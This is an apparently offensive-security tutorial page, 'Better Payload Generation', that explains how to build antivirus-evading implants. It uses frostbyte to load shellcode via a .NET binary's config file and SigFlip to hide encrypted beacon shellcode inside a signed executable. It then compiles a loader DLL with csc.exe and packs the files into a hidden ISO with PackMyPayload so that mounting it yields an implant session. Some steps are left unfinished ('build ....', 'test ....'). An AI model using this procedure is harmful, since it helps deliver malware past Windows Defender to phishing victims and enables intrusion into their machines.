+++
title = "Better Payload Generation"
weight = 100
+++

### Better implants (frostbyte bypass windows defender)

Instead of generating a executable. We can generate shellcode. We can then use something like [https://github.com/pwn1sher/frostbyte](https://github.com/pwn1sher/frostbyte) to load that shellcode into memory and execute it.

Lets get download the [frostbyte zip](https://github.com/pwn1sher/frostbyte/archive/refs/heads/main.zip) from Github. Extract it to the desktop.

We need a .net binary with a .exe.config file. Windows has lots of those in `C:\Windows\Microsoft.NET\Framework64\v4.0.30319`.

![Windows Executable with Config](/static/how-to-phishing/windows-executable-with-config.png)

Generate shellcode


```bash
./SigFlip.exe -i "C:\Users\Administrator\Desktop\frostbyte-main\jsc.exe" "C:\Users\Administrator\Desktop\frostbyte-main\beacon64.bin" "C:\Users\Administrator\Desktop\frostbyte-main\test.exe" "secret"
```

We need to update the config file and replace the values of update and A54IPK. We also need to update `privatePath` to be a relative path `.`


open test.cs in visual studio. change the value of A54IPK 


```  

byte[] _peBlob = Read("test.exe");

byte[] _data = Decrypt(shellcode, "secret");
```
build ....


We'll also want to change some of the code to be a little different


```
C:\windows\Microsoft.NET\Framework\v3.5\csc.exe /target:library /out:test.dll ..\frostbyte-main\test.cs

```





test ....



### PackMyPayload

https://github.com/mgeeky/PackMyPayload

Create a new folder and andd your files (.dll, .exe, .exe.config)

```
./PackMyPayload.py --hide test.dll,test.exe.config foldername isoname.iso -v
```

now we should be able to mount the iso and run our exe to get an implant session.